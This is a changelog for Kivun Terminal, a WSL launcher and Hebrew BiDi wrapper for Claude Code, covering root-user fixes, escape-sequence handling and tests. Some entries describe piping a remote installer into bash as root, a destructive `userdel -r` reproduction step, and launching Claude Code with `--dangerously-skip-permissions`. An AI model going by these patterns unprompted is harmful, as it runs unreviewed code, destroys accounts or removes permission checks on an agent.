User-reported real install failure on a machine where `/mnt/wslg/runtime-dir` was owned by `root` (fresh Ubuntu setup, default WSL user is root, or distro from cloud-init). The launcher faithfully detected the WSLg owner and ran as root, the wrapper deployed to `/root/.local/share/kivun-terminal/...`, and Claude Code immediately exited with `--dangerously-skip-permissions cannot be used with root/sudo privileges for security reasons`. From the user's perspective: Kivun opens, prints "Claude exited with code 1", crashes.

### Fixed

- **`payload/kivun-terminal.bat` v1.1.14**: when `WSLG_USER` resolves to `root`, the launcher now queries `wsl -d Ubuntu --user root -- id -un 1000` to find the conventional first non-root user, and uses that for the WSL launch instead of root. If no UID-1000 user exists, the launcher aborts with a clear error message and copy-paste-able instructions for creating one (`adduser`, `usermod -aG sudo`, `ubuntu config --default-user`, `wsl --terminate`).
- **`payload/kivun-launch.sh` v1.1.14 (defense in depth)**: a guard at the top of the WSL-side launcher that refuses to run when `EUID=0`. If somehow the .bat detection is defeated upstream, or someone invokes the bash launcher directly via `wsl --user root -- bash kivun-launch.sh`, this prints the same fix-instructions and exits 1 before reaching Claude.

### Why this didn't surface earlier

Most Kivun users created their Ubuntu via the standard MS Store image, which prompts for a username on first run and creates UID 1000. WSLg ends up owned by that user. The WSLG_USER detection (added v1.1.4) Just Works and the launcher runs as the right user.

The reported case (user `mipmip`) had Ubuntu's default user as root — likely a fresh install that skipped the user-creation prompt, or a custom distro image. There the WSLG_USER detection returned `root`, the launcher dutifully passed `--user root`, and the chain failed with a confusing Claude error message instead of a clear "create a non-root user first."

### Test path (manual, no unit test for Windows .bat / WSL launch)

To reproduce + verify locally:

```cmd
REM 1. Reset to a "no non-root user" state (DESTRUCTIVE - back up first):
REM    wsl -d Ubuntu --user root -- userdel -r yourname
REM    ubuntu config --default-user root
REM 2. Run Kivun. Should now show the v1.1.14 error message with
REM    instructions instead of crashing with the Claude exit-code-1 message.
```

## [1.1.13] - 2026-04-27

> **Status:** USER-CONFIRMED WORKING. Verified against a real Hebrew Claude session on Konsole 23.08.5 (Ubuntu 24.04 LTS, April 27, 2026). The wrapper processes the actual user `dump.bin` cleanly: 55 cursor-forwards replaced + 98 SGR codes stripped, single attribute region per RTL line, English/code runs land at UAX #9 logical positions inside Hebrew sentences.

The actual word-order fix. v1.1.10–v1.1.12 chased the wrong cause. After enabling `KIVUN_BIDI_DUMP_RAW=on` and capturing the byte stream Claude actually emits in TUI mode, the root cause turned out to be cursor-forward CSI escapes — `\x1b[1C` instead of literal space characters between every word. 19 KB of one short Hebrew session contained **306 cursor-forward CSIs**. Konsole's BiDi engine treats each `\x1b[NC` as an attribute-region boundary the same way it treats SGR color changes — exactly the splitter that v1.1.10 FLATTEN_COLORS_RTL was supposed to eliminate, but FLATTEN only stripped CSI sequences ending in `m`.

That's why earlier deep-test fixtures rendered correctly but real Claude output kept misposition: the deep tests used plain `printf` with literal spaces. Claude's TUI does not.

### Added

- **CSI cursor-forward replacement on RTL lines** (extends the existing `KIVUN_BIDI_FLATTEN_COLORS_RTL` flag — same semantics, broader coverage). When the line's first strong char is Hebrew and `KIVUN_BIDI_FLATTEN_COLORS_RTL=on` (default), the wrapper now also intercepts CSI sequences ending in `C` and replaces each `\x1b[NC` with N literal space characters. Visually identical (cursor-forward moves over presumed-blank cells; spaces write to those same cells), but no attribute-region boundary so Konsole sees the entire RTL line as a single BiDi run and positions LTR runs (English/code/numbers) at their correct UAX #9 logical positions.
- **`Injector#cursorForwardReplacedCount` public counter** for tests + diagnostics, in addition to the existing `flattenedSgrCount`.
- **Regression test suite** (`kivun-claude-bidi/test/cursor-forward-rtl.test.js`, 9 tests) covering single + multi-column cursor-forward, default-no-param `\x1b[C`, no-touch on LTR lines, no-touch on other CSI cursor sequences (up/back/etc.), compound with SGR strip on the same line, and a verbatim-Claude-dump-pattern fixture.

### Why three earlier releases didn't catch this

- v1.1.10 (FLATTEN_COLORS_RTL) only handled CSI ending in `m`. It eliminated visible color codes from Hebrew lines but the cursor-forward CSIs Claude uses for inter-word spacing kept splitting BiDi runs.
- v1.1.11 (no per-run RLE/PDF on RTL lines) eliminated the wrapper-emitted attribute boundaries. But Claude's own cursor-forwards remained.
- v1.1.12 (Hebrew prompt formatting hint) tried to fix it by changing what Claude generates. It backfired — the long prompt confused Claude into reordering words. **Reverted: do not use the v1.1.12 prompt change in production. v1.1.13 ships the v1.1.10/v1.1.11 prompt unchanged.** The CHANGELOG keeps the v1.1.12 entry for history but treats that release as withdrawn.
- We needed `DUMP_RAW=on` (added in v1.1.10) plus a real Hebrew session to see the cursor-forward pattern. Without that diagnostic, we'd have kept guessing.

### Lesson learned (carried into the BiDi limits memory entry)

When a wrapper-rendered terminal output looks wrong even though all visible escapes are stripped, look for *invisible* CSI sequences that act as attribute-region boundaries. Cursor-forward (`...C`), cursor-back (`...D`), set/reset mode (`...h`/`...l`) all qualify. The dump-raw side log answers "what bytes are actually on the wire" — anything that looks like normal text in the dump but is actually an escape sequence is a candidate splitter.

## [1.1.12] - 2026-04-27

Hebrew system-prompt formatting hint. v1.1.11 closed the wrapper-side investigation: BiDi rendering is now correct for the bytes Claude actually emits. But Claude's mixed Hebrew/English output sometimes had unusual spacing patterns (`עדכוןsrc/components/Header.tsx` glued, `הזה-endpoint` with the demonstrative on the wrong side via hyphen) that look broken even though the wrapper renders them faithfully. Fix at the source: tell Claude how to format Hebrew/English mixed text via `--append-system-prompt`.

### Changed

- **Hebrew language prompt** (`payload/languages.sh` + `payload/kivun-terminal.bat`) now includes spacing/demonstrative-placement guidance:
  - Always insert a space between Hebrew text and a foreign token (`'הקובץ src/index.ts'`, not `'הקובץsrc/index.ts'`)
  - Place demonstratives like `הזה`, `הזאת`, `האלה` AFTER the foreign noun with a space (`'ה-endpoint הזה'`, not `'הזה-endpoint'`)
  - The `'ה-'` prefix attaches directly to a single foreign noun via hyphen with no space (`'ה-API'`, `'ה-backend'`); other Hebrew words must be space-separated from foreign tokens

The hint applies only when `RESPONSE_LANGUAGE=hebrew` is set in `config.txt`. Other languages and English-only sessions are unaffected.

### Why a prompt-only release

The wrapper itself shipped its full mixed-content fix in v1.1.11 (no per-run RLE/PDF on RTL lines). What was left was source-text quality from Claude — the wrapper preserves bytes faithfully, but if Claude generates `הזה-endpoint` it'll render exactly that, even though it's not idiomatic Hebrew. v1.1.12 nudges Claude toward better source text via the system prompt. Wrapper code unchanged from v1.1.11; this is a payload/config update only.

## [1.1.11] - 2026-04-27

THE actual mixed-content positioning fix. v1.1.10 reduced the problem (no more visible color codes on Hebrew lines) but real Claude output still mispositioned `Claude Code`, `React 19`, numbers, and other LTR runs inside Hebrew sentences. Investigation revealed the wrapper's own RLE/PDF brackets were causing what was left.

### The follow-up A/B test (April 2026 on Konsole 23.08.5)

After v1.1.10 shipped and the user reported residual misposition, ran `Kivun-BiDi-Deep-Test.bat` — three renderings of the same problem strings:

- **TEST A**: plain `printf` (no wrapper involvement at all)
- **TEST B**: RLM at line-start only
- **TEST C**: RLM + ONE RLE/PDF pair around the whole line

**All three rendered the LTR runs at their correct UAX #9 logical positions.** The thing that made v1.1.10 still broken was the wrapper's own habit of bracketing Hebrew runs *individually* — on a line like `אני משתמש ב-Claude Code-בעברית` it emitted `RLM + RLE + "אני משתמש ב-" + PDF + "Claude Code" + RLE + "-בעברית" + PDF`, creating multiple PDF/RLE transitions that Konsole treated as attribute-region boundaries (the same boundary class as SGR color changes that v1.1.10 fixed).

So per-run RLE/PDF brackets were *themselves* the attribute-region splitters that v1.1.10 was fighting. Removing them on RTL lines closes the loop.

### Added

- **`KIVUN_BIDI_BRACKET_RTL_RUNS` config option** (default `off`) — when off, Hebrew runs INSIDE RTL paragraphs no longer get individual RLE/PDF brackets. Line-start RLM + Konsole's native UAX #9 handle direction across the whole single-attribute line. Hebrew runs INSIDE LTR paragraphs (`Hello שלום world`) still get bracketed because the Hebrew is an exception in an LTR flow and *needs* the marker. Set to `on` if you want the legacy v1.1.0–v1.1.10 behavior back for some reason.
- **Regression test suite** (`kivun-claude-bidi/test/no-bracket-rtl-runs.test.js`, 12 tests) covering off/on modes, Hebrew-only lines, the `Claude Code` mid-Hebrew pattern, the `React 19` pattern, numbers + colon inside Hebrew, the legacy bracketing-still-applies-on-LTR-lines case, line-start RLM preservation, multi-line direction switching, and integration with v1.1.8 strip-bullet.

### Changed

- **All four pre-v1.1.11 test files** (`core.test.js`, `extended.test.js`, `strip-bullet.test.js`, `strip-incoming.test.js`, `flatten-colors-rtl.test.js`) now opt into legacy bracketing with `process.env.KIVUN_BIDI_BRACKET_RTL_RUNS = 'on'` at the top of the file. Their fixtures pre-date v1.1.11 and assert the per-run-bracket pattern; the new no-bracket-on-RTL behavior is exercised only by the new test/no-bracket-rtl-runs.test.js suite.
- **`runIsBracketed` instance flag added to Injector** so PDF emission only fires when the matching RLE was emitted. With per-run bracketing off on RTL lines, no RLE is emitted on entry → no PDF on exit.

### Why three releases instead of one

v1.1.9 (strip-incoming) ruled out "Claude is polluting the stream" — the stream is clean. v1.1.10 (flatten-colors) ruled out "ANSI SGR is splitting BiDi runs" — fixing it eliminated colors but not misposition. v1.1.11 (no per-run brackets) caught the actual cause: **the wrapper itself was a stream polluter from Konsole's perspective.** Each layer was needed to isolate the next layer; shipping incrementally let real-user evidence drive each decision rather than guessing all the layers at once.

## [1.1.10] - 2026-04-27

The mixed-content positioning fix we said was "blocked on Konsole 24+" turned out to be possible from the wrapper after all, once we identified the actual root cause. Plus a debug-only diagnostic for future investigation.

### The architectural finding (April 2026 A/B test on Konsole 23.08.5)

User's earlier screenshots showed English/code runs landing at the visual LEFT edge inside Hebrew sentences (e.g., `React 19` in `אנחנו עובדים עם React 19 ו-Next.js 15` ended up at column 1 from the right instead of the logical column 4). v1.1.9 strip-incoming proved Claude's stream wasn't the cause (no upstream bidi controls in real sessions). That left two hypotheses for what Konsole was doing wrong, distinguishable by an A/B test:

1. **Konsole's BiDi is broken across the line** — no wrapper trick can fix this; we'd be stuck waiting for newer Konsole.
2. **Konsole's BiDi is broken at color/SGR boundaries** — the wrapper can fix this by stripping SGR escapes from RTL lines so the whole line is a single attribute run.

The test (run via `Kivun-BiDi-Color-Test.bat`, available on request): same Hebrew/English mixed text rendered (a) plain — no SGR escapes — and (b) with Claude-style syntax-color SGR around the English runs. **The plain version positioned LTR runs correctly; the colored version misplaced them to the visual left.** Hypothesis #2 confirmed.

This matches what the freedesktop.org Terminal Working Group documented for Konsole upstream:

> "Applies BiDi on continuous runs of identical attributes. Any change in e.g. color (or even highlight with the mouse, or the cursor being positioned inside) stops and starts it anew, often resulting in a confusing and incorrect visual behavior." — [terminal-wg.pages.freedesktop.org/bidi/prior-work/terminals.html](https://terminal-wg.pages.freedesktop.org/bidi/prior-work/terminals.html)

So Konsole has no real BiDi engine; it just hands continuous-attribute regions to Qt's text layout, and Qt has no idea where a colored fragment logically belongs in the surrounding RTL paragraph. This is **not** a "newer Konsole fixes it" problem — it's architectural and KDE has shown no signs of changing it. Earlier docs/changelog notes saying "wait for Konsole 24.04+" were a wrong guess on my part.

### Added

- **`KIVUN_BIDI_FLATTEN_COLORS_RTL` config option** (default `on`) — strips ANSI SGR sequences (CSI sequences ending in `m`) from any line whose first strong char is Hebrew. Result: the whole RTL line is a single attribute run, Konsole's BiDi gets a clean line to work with, and LTR runs (English, code paths, numbers) land at their correct UAX #9 logical positions. Cursor positioning, screen clear, OSC window-title, and other non-SGR CSI sequences pass through unchanged. LTR lines are never touched. Trade-off: visible loss of syntax color on Hebrew lines. Most Hebrew-focused users prefer correct positioning over color; set this to `off` if your workflow is mostly English code and you want color back at the cost of broken positioning when Hebrew appears.
- **`KIVUN_BIDI_DUMP_RAW` config option** (default `off`) — debug-only counterpart to v1.1.9 strip-incoming. When `on`, every chunk Claude sends gets appended to `~/.local/state/kivun-terminal/bidi-raw-dump.bin` BEFORE strip-incoming/flatten-colors processing runs. Per-session `=== session start TIMESTAMP ===` and `=== session end TIMESTAMP ===` markers delineate runs. File auto-rotates to `.bin.old` when its size crosses 5 MiB at session start (bounds total disk use to ~10 MiB regardless of how long it's left on). Useful for diagnosing future render bugs where you need raw byte context, not just the strip log's count.
- **`KIVUN_BIDI_DUMP_RAW_FILE` env override** — points the dump at an alternate path. Used by the regression test suite to keep dumps off the user's real `~/.local/state` directory.
- **Regression test suite for flatten-colors** (`kivun-claude-bidi/test/flatten-colors-rtl.test.js`, 12 tests) covering on/off modes, single + multi-param SGR, mid-Hebrew SGR (the "color one word" pattern), the "React 19" inline-English-in-Hebrew pattern, no-touch on LTR lines, no-touch on non-SGR CSI (cursor/clear), no-touch on OSC, chunk-boundary-mid-CSI handling, multi-line direction switching, and integration with v1.1.8 strip-bullet.
- **Regression test suite for dump-raw** (`kivun-claude-bidi/test/dump-raw.test.js`, 7 tests) covering off/on modes, verbatim pre-strip byte capture, session marker placement, multi-chunk arrival order, the 5 MiB rotation guard, and the no-rotate-below-threshold case.

### Changed

- **Pre-existing tests in `core.test.js`, `extended.test.js`, and `strip-bullet.test.js` opt out of FLATTEN_COLORS_RTL** by setting `process.env.KIVUN_BIDI_FLATTEN_COLORS_RTL = 'off'` at the top of each file. Those tests pre-date v1.1.10 and assert the legacy SGR-passthrough behavior; the new on-by-default behavior is exercised in the new flatten-colors-rtl.test.js suite.
- **`_stepAfterLineStart` restructured to buffer-and-decide for CSI sequences** instead of byte-by-byte passthrough. Required so SGR sequences can be dropped as a unit (we don't know it's SGR until the final byte; without buffering we'd already have emitted ESC + [ + params before knowing).

### Updated honest framing

Earlier v1.1.8 and v1.1.9 changelog entries described the mixed-content positioning issue as "pending Konsole 24.04+ from a future Ubuntu LTS." That framing was incorrect — the bug is architectural in Konsole and the fix needed to be wrapper-side. v1.1.10 ships that fix.

### Inspection cookbook for KIVUN_BIDI_DUMP_RAW

Once `KIVUN_BIDI_DUMP_RAW=on` and a Kivun session has run, useful one-liners (in WSL):

```bash
# Full dump in a pager that handles ANSI escapes:
less -R ~/.local/state/kivun-terminal/bidi-raw-dump.bin

# Just the bidi control chars and 20 chars of context on each side:
grep -aPo '.{0,20}[\x{202A}-\x{202E}\x{2066}-\x{2069}].{0,20}' \
    ~/.local/state/kivun-terminal/bidi-raw-dump.bin

# Hex view (RLE = e2 80 ab, PDF = e2 80 ac, etc.):
xxd ~/.local/state/kivun-terminal/bidi-raw-dump.bin | head -40

# Stream size per session (look for the markers):
grep -c '=== session ' ~/.local/state/kivun-terminal/bidi-raw-dump.bin
```

## [1.1.9] - 2026-04-27

Defensive guardrail with built-in measurement: the wrapper now strips explicit Unicode directional controls from Claude's upstream stream so the wrapper is the only source of directionality information reaching Konsole. Default mode is `auto` — strip silently, but log the first detection per session to a side file so we can tell whether stream pollution is actually happening in real installs (vs. all rendering bugs being Konsole's fault).

### Added

- **`KIVUN_BIDI_STRIP_INCOMING` config option** (default `auto`) — strips embedding controls (`U+202A` LRE, `U+202B` RLE, `U+202C` PDF, `U+202D` LRO, `U+202E` RLO) and isolate controls (`U+2066` LRI, `U+2067` RLI, `U+2068` FSI, `U+2069` PDI) from Claude's stream before the wrapper processes it. Preserves `U+200E` LRM and `U+200F` RLM since the wrapper itself injects RLM at line-start. Modes:
  - `off` — passthrough; controls reach the terminal as-is
  - `auto` — strip + count + log a single line on first detection (default)
  - `on` — strip + count + log every chunk where stripping happened (verbose; useful when investigating a specific render bug)
- **Side diagnostic log at `~/.local/state/kivun-terminal/bidi-strip.log`** — overridable via `KIVUN_BIDI_LOG_FILE`, follows XDG state-dir convention. Lets us answer "is Claude actually polluting the stream?" from real-user installs without a packet capture. Silent by default — only writes when something is actually stripped.
- **Regression test suite** (`kivun-claude-bidi/test/strip-incoming.test.js`, 12 tests) covering all three modes, every char in both stripped ranges, LRM/RLM preservation, cumulative cross-chunk counting, log-write semantics, and non-interference with the v1.1.8 strip-bullet pipeline.

### Why this is `auto` not `on` by default

If most observed Claude output contains zero directional controls, the strip is a no-op in practice — the value of leaving it on is the side log. The framing here is "guardrail with measurement, not a fix": before adding more wrapper heuristics for mixed-content positioning, we want evidence about whether the upstream stream is even contributing to the problem. After a few weeks of real-world use, the log file content tells us either "yes, refine the wrapper" or "no, blame Konsole and stop tweaking the wrapper."

### Closed without merging

- **PR #47 — `experiment/rli-pdi-isolates`** (RLI/PDI isolate wrapping for mixed-content LTR-run positioning). Hypothesis was that wrapping Claude's English/code runs in `U+2067` RLI / `U+2069` PDI would give Konsole's BiDi engine enough hint to position them correctly inside Hebrew paragraphs. User testing on Konsole 23.x showed the isolates regressed the v1.1.8 strip-bullet behavior (Hebrew bullet lines went back to LTR). Conclusion: Konsole 23.x's BiDi engine cannot correctly handle the isolate marks; mixed-content LTR-run positioning remains a known limitation pending Konsole 24.04+ from a future Ubuntu LTS.

## [1.1.8] - 2026-04-26

Workaround for the Konsole 23.x bullet-LTR rendering bug. Hebrew bullet lines from Claude (lines starting with `●`) were rendering with the bullet stuck on the LEFT side of the screen on Ubuntu 24.04 LTS, even though the wrapper correctly injected RLM at line-start. Empirical investigation traced this to Konsole 23.x's BiDi engine classifying the leading `●` as a direction-anchoring neutral and refusing to flip the line RTL.

### Added

- **`KIVUN_BIDI_STRIP_BULLET` config option** (default `on` in v1.1.8) — strips the leading `●` from any line whose first strong char is Hebrew. With no neutral preceding the Hebrew, Konsole's "first non-whitespace char wins" picks Hebrew and renders the line right-aligned. Trade-off: visible `●` disappears on Hebrew bullet lines (indentation stays). English bullet lines unaffected. Set to `off` in `config.txt` if you're on Konsole 24.04+ and want bullets back.
- **Regression test suite** (`kivun-claude-bidi/test/strip-bullet.test.js`, 7 tests) pinning the strip behavior across env values and edge cases.

### Known limitation

Mixed RTL/LTR content positioning on Konsole 23.x doesn't always follow Unicode UAX #9 — LTR runs (English, numbers) inside RTL paragraphs may appear in unexpected visual positions (e.g., `React 19` lands at column 1 from the right instead of column 4). This is a Konsole BiDi engine issue; an experimental `KIVUN_BIDI_USE_ISOLATES=on` option is on the `experiment/rli-pdi-isolates` branch ([PR #47](https://github.com/noambrand/kivun-terminal-wsl/pull/47)) as a possible workaround. Expected to fully resolve when Ubuntu ships Konsole 24.04+ in apt.

## [1.1.7] - 2026-04-26

Two related Konsole/VcXsrv UX fixes plus the bilingual hero and statusline polish that hitchhiked on the cut.

### Fixed

- **Closing the launcher cmd window no longer kills the live Claude session.** Previous launch was `konsole ... &`, which made Konsole a child of the wsl-spawned bash; closing the small cmd.exe launcher window SIGHUP'd Konsole and tore down whatever Claude session was in flight. Konsole is now wrapped in `setsid` so it detaches from the launcher process group and survives the cmd.exe close.

### Added

- **Branded window icon over VcXsrv.** Konsole sets only an empty `_NET_WM_ICON_NAME`, so VcXsrv was falling back to its own X glyph in the taskbar. After the WID is known, `payload/kivun-launch.sh` now invokes the new `payload/kivun-set-icon.py` to write a real `_NET_WM_ICON` via python-xlib (4 sizes 16/32/48/64, ARGB pixels, source PNG background removed via corner floodfill). Best-effort: skips silently if `python3-xlib` / `python3-pil` / the source PNG are missing. The Windows installer (`installer/Kivun_Terminal_Setup.nsi`) now auto-installs `python3-xlib` and `python3-pil` so this path works out of the box.
- **Bilingual He/En README hero** ([PR #38](https://github.com/noambrand/kivun-terminal-wsl/pull/38)) — the top-of-page hero now sells features in both languages instead of just brand.

### Changed

- **Statusline padding bumped to `padding=1`** ([PR #42](https://github.com/noambrand/kivun-terminal-wsl/pull/42)) so the status line breathes a bit more inside Konsole.

## [1.1.6] - 2026-04-26

Active path discovery for `claude`. After absolute slots miss, the launcher and the wrapper now ask the login shell where Claude lives instead of giving up — so users with `nvm`, `pnpm`, `yarn-global`, `snap`, or corporate-managed installs are not forced to set `KIVUN_CLAUDE_BIN`.

### Fixed

- **`bash -lc "command -v claude"` fallback in launcher and wrapper** ([PR #37](https://github.com/noambrand/kivun-terminal-wsl/pull/37)). After v1.1.5 narrowed the presence check to a deterministic absolute-path chain (`~/.local/bin/claude` → `/usr/local/bin/claude` → `/usr/bin/claude`), users with non-standard installs hit a "claude not found" / re-install loop because their actual binary lived under `~/.nvm/...` or `~/.local/share/pnpm/` etc. Both `payload/kivun-terminal.bat` (Windows) and `kivun-claude-bidi/lib/resolve-claude-bin.js` (wrapper resolver) now run `bash -lc "command -v claude"` as a final discovery step before declaring Claude missing.
- **Bash launcher reads `VERSION` dynamically** ([PR #35](https://github.com/noambrand/kivun-terminal-wsl/pull/35)) so the launch log no longer prints a stale `v1.0.6` tag after upgrades.

### Changed

- **`docs/VCXSRV_TROUBLESHOOTING.md`** clarifies that VcXsrv-unreachable is usually fine on modern Windows 11 — WSLg covers the same surface ([PR #36](https://github.com/noambrand/kivun-terminal-wsl/pull/36)).

## [1.1.5] - 2026-04-26

Stop reinstalling Claude on every launch.

### Fixed

- **Presence check no longer triggers a fresh `curl ... | bash` install on every launch** ([PR #34](https://github.com/noambrand/kivun-terminal-wsl/pull/34)). The old check was `bash -c "command -v claude"` — a non-login bash that does not source `~/.profile`, so `~/.local/bin` (where the official `claude.ai/install.sh` curl installer drops the binary) was not on `PATH`. Result: Claude was always reported "missing" and the v1.1.1 auto-install path fired again on every launch. Replaced with an absolute-path `test -x` chain over `~/.local/bin/claude`, `/usr/local/bin/claude`, `/usr/bin/claude`. Same fix applied in the wrapper resolver `kivun-claude-bidi/lib/resolve-claude-bin.js` so the wrapper agrees with the launcher about whether Claude exists.

### Changed

- **Hebrew README polish (multiple iterations).** PRs #18–#33 covered RTL on the Smart App Control note, arrow direction in RTL contexts, the new `docs/HEBREW_RTL_GITHUB.md` contributor guide, flag-image rendering on Windows GitHub, language-pill table layout, Hebrew section parity with English, working LinkedIn badge, and the corrected Claude Desktop comparison.

## [1.1.4] - 2026-04-26

### Fixed

- **Konsole user detection + `:run_direct` claude PATH** ([PR #17](https://github.com/noambrand/kivun-terminal-wsl/pull/17)).

## [1.1.3] - 2026-04-25

### Changed

- **Launcher installs Claude without asking `[Y/N]`** ([PR #16](https://github.com/noambrand/kivun-terminal-wsl/pull/16)). The v1.1.1 auto-install prompt was friction users were always going to answer `Y` to; collapsed to an automatic install with the same loud logging.

## [1.1.2] - 2026-04-25

Maintenance release between v1.1.1 and v1.1.3 (no user-facing PR notes attached to the GitHub release).

## [1.1.1] - 2026-04-25

### Fixed

- **Launcher no longer invokes `claude` after detecting it is missing in WSL.** Prior behavior on a clean WSL install (Claude Code not yet installed inside Ubuntu): the launcher printed `ERROR - Claude Code not found in Ubuntu`, then logged `INFO - Falling back to direct Claude execution in terminal`, then ran the exact same WSL invocation that just failed. The result was `bash: claude: command not found` and a launcher that ended on a crash instead of a help message. The "fallback" was a lie — it went through the same WSL shell that had just reported Claude missing. The presence check in `kivun-terminal.bat` now either leads to a successful auto-install path or a clean exit with real manual instructions; the `:run_direct` block is gated by a new `CLAUDE_IN_WSL` flag and refuses to run when Claude is known-missing.

### Added

- **Optional one-shot Claude Code auto-install inside Ubuntu when missing.** When the WSL presence check fails, the launcher now prints a clear explanation (including "Windows-side Claude Code does NOT work here - Konsole runs in WSL") and prompts the user to install Claude Code inside Ubuntu. On `Y`, it runs the official `curl -fsSL https://claude.ai/install.sh | bash` installer as root (avoiding sudo-TTY hangs), with a `apt-get install nodejs npm + npm install -g @anthropic-ai/claude-code` fallback if the curl installer fails. Matches the installer NSI's existing two-step strategy so behavior is identical whether the user runs the full installer or hits a missing-Claude state on launch.
- **`claude --version` captured to LAUNCH_LOG.txt** after a successful auto-install, so future bug reports include the exact Claude Code version the user has.

### Changed

- **"NOT FOUND" message points at the official `curl` installer, not the deprecated `npm install -g @anthropic-ai/claude-code`.** Per [Anthropic's current docs](https://docs.claude.com/en/docs/claude-code/setup), the npm-global path is deprecated. The installer NSI already uses the curl script primary with npm fallback; the launcher message was out of sync and told users to run the deprecated command. Now consistent.
- **Exit code 2 when Claude is absent and the user declines auto-install.** Previously the launcher would have crashed through `:run_direct` with whatever `claude` returned (typically 127). Now it exits deliberately with a distinguishable code so wrapping scripts can detect this specific state.
- **`docs/TROUBLESHOOTING.md`** "Claude Code: NOT FOUND" section rewritten to document v1.1.1 auto-install behavior and explicitly note that Windows-side Claude Code does not help because Konsole runs inside WSL.

### Known limitations

- The `:run_direct` label is still misleading (it runs Claude inside WSL, not natively on Windows). Keeping the name for v1.1.1 to keep the diff reviewable; rename planned for v1.2.0.

## [1.1.0] - 2026-04-23

### Added

- **BiDi wrapper (`kivun-claude-bidi`).** Wrapper that pipes Claude Code output through a state machine doing two complementary BiDi fixes:
  1. **Bracket every Hebrew run** with Unicode RLE (U+202B) / PDF (U+202C) - forces RTL direction within each run regardless of Konsole profile settings.
  2. **Inject RLM (U+200F) at the start of any line whose first strong char is RTL** - forces the whole line's paragraph direction to RTL, which fixes the Claude Code `● שלום` first-line bug where the bullet prefix would otherwise make Konsole pick LTR paragraph direction.
  Both fixes together mean Hebrew responses render right-aligned from the first line, not just from the second onward. Detection covers Hebrew block (U+0590–U+05FF) and Hebrew presentation forms (U+FB1D–U+FB4F). Lines whose first strong char is Latin (`Hello`, `def foo():`, etc.) get no RLM so English content stays left-aligned.
  - **Default: on.** Ships enabled so Hebrew in Claude Code output works without manual config edits. Disable by setting `KIVUN_BIDI_WRAPPER=off` in `%LOCALAPPDATA%\Kivun-WSL\config.txt` and relaunching.
  - **First enable** runs `npm install --production` inside WSL to build `node-pty` (~5–15 s, one-time). An install stamp (`.kivun-install-stamp`) under `node_modules/` gates subsequent launches to instant startup. Stamp invalidates if the shipped `package.json` is newer.
  - **Deploy target:** `~/.local/share/kivun-terminal/kivun-claude-bidi/` (WSL-native, not `/mnt/c/...`) so `node-pty` builds against real Linux paths and avoids the filesystem-performance / path-translation penalty of `/mnt/c`.
  - **Fallback:** if the key is `on` but the wrapper binary isn't reachable (missing install, failed `npm install`), the launcher logs a loud WARNING and runs unwrapped `claude` so the user never sees a silent launch failure.
  - **Installer packaging:** the `kivun-claude-bidi/` source tree ships under `$INSTDIR\kivun-claude-bidi\` (no `node_modules`; that's built on first enable). Uninstaller removes the tree recursively.
  - **Cross-platform parity (Mac + Linux):** the wrapper now ships in all three installers, not just Windows.
    - **Linux** (`linux/install.sh`): copies the wrapper source to `~/.local/share/kivun-terminal/kivun-claude-bidi/` and runs `npm install --production` once at install time. If npm isn't on PATH yet (Node was just installed in the same run and the user's shell hasn't re-resolved), the launcher's `ensure_wrapper_installed` retries on first launch - same `.kivun-install-stamp` pattern as the WSL launcher. Also fixes a latent bug: the launcher previously set `CLAUDE_EXEC` but the inner launch script invoked `claude` literally, so the wrapper was never actually used on Linux even when configured on.
    - **macOS** (`mac/build.sh` + `mac/scripts/postinstall`): the `.pkg` bundles the wrapper source under `scripts/kivun-claude-bidi/`; postinstall copies it to `/usr/local/share/kivun-terminal/kivun-claude-bidi/` and runs `npm install --production` as the real user (so `node-pty` builds against the correct arch - Intel vs Apple Silicon). The desktop `.command` shortcut now reads `KIVUN_BIDI_WRAPPER` from config and dispatches to the wrapper binary in three branches: default Terminal.app, iTerm2 respawn, and (no-op) WezTerm respawn.
    - Both inline `config.txt` templates (linux installer + mac postinstall) now seed `KIVUN_BIDI_WRAPPER=on`, matching the Windows default.
    - Existing uninstallers already remove the parent share directory, so the wrapper tree is cleaned up without changes to `linux/uninstall.sh` or `mac/uninstall.sh`.
  - **Test coverage:**
    - 18 injector unit fixtures (all passing) covering the HEAVY spec §7 core set (10 ship-blocking: ASCII baseline, pure Hebrew line, mixed-script, multiple runs, Hebrew-space-Hebrew, mid-run ANSI SGR, chunk boundary mid-Hebrew, chunk boundary mid-UTF-8 codepoint, newline inside run, 500-char paragraph) plus 8 extended (Hebrew-comma-Hebrew, Hebrew-period-English, Hebrew-in-parens, chunk mid-CSI, presentation forms, emoji, bracketed-paste, alt-screen toggle).
    - 3 capability-check + 5 terminal-detect tests.
    - End-to-end `test/smoke.sh` spawning the wrapper via node-pty against a fake-claude stand-in and asserting bracket placement in the captured output. 7/7 checks green.
  - **Architecture spec:** `docs/specs/CLAUDE_CODE_TASK_RTL_WRAPPER_HEAVY.md` (RLE/PDF embedding design, edge-case handling, fallback heuristics). Alternatives considered and rejected: RLI/PDI isolates (v2 candidate if we observe direction-leak artifacts), line-start RLM (MEDIUM spec, deferred - `docs/specs/CLAUDE_CODE_TASK_RTL_WRAPPER_MEDIUM_DEFERRED.md` for the decision trail), full xterm.js headless state machine (rejected as over-engineering).
  - **Integration gate status:** §1 of HEAVY requires three `printf` lines in a functioning Konsole to empirically confirm RLE/PDF rendering. Deferred to pre-tag per canary-gated-ship plan; see `docs/research/integration-gate-status.md` for the three acceptable paths and `docs/research/pty-probe-2026-04-23.zip` for the prototype decision trail.
  - **§1a LTR-island fixtures (added 2026-04-24):** 6 new tests in `test/ltr-island.test.js` covering Hebrew-dominant lines with embedded English tokens (the `קלט → Process → תוצאה`, `הפעלה של npm install אמורה לעבוד`, `קובץ config.txt נמצא ב-~/.local/share/`, and `שגיאה ב-line 42 של injector.js` cases plus two non-substitution checks for arrows and box-drawing chars). All 6 pass with the existing RLE/PDF-only algorithm — confirms LRI/PDI isolates are not needed. Total fixture count now 36/36 green.

- **`docs/specs/BIDI_ALGORITHM.md` (new).** Records the three BiDi algorithms considered (RLE/PDF only; RLE/PDF + LRI/PDI; full xterm.js-style state machine) and the evidence-based decision to ship Option A (RLE/PDF only). Also documents the §8 non-substitution rule and the tree-visual-on-Hebrew-lines limitation.

- **Bilingual README (English + Hebrew).** Root `README.md` now has language pill jump-links at the top (`English 🇬🇧` / `עברית 🇮🇱`), with the English content followed by a complete Hebrew mirror — not a machine translation. `<!-- REVIEW_HE -->` markers flag phrases for native-speaker review at PR time.

